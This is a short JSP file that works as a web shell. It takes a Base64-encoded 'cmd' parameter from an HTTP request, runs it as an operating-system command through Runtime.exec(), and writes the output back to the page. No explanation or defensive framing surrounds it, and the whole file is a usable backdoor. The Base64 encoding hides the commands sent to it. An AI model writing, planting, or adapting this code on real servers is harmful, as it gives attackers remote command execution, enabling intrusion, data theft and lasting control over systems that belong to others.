<%@ page import="java.util.*,java.io.*,sun.misc.BASE64Decoder"%>
<%
if (request.getParameter("cmd") != null) { 
	String tmp = request.getParameter("cmd");
	try{
		String str = new String((new BASE64Decoder()).decodeBuffer(tmp));
		Process p = Runtime.getRuntime().exec(str);
		InputStream in = p.getInputStream();
		BufferedReader br = new BufferedReader(new InputStreamReader(in,"GBK"));
		String brs = br.readLine();
		while(brs!=null){
			out.println(brs+"</br>");
			brs = br.readLine();
            }
    }catch(Exception ex){
			out.println(ex.toString());
	} 
}
%>
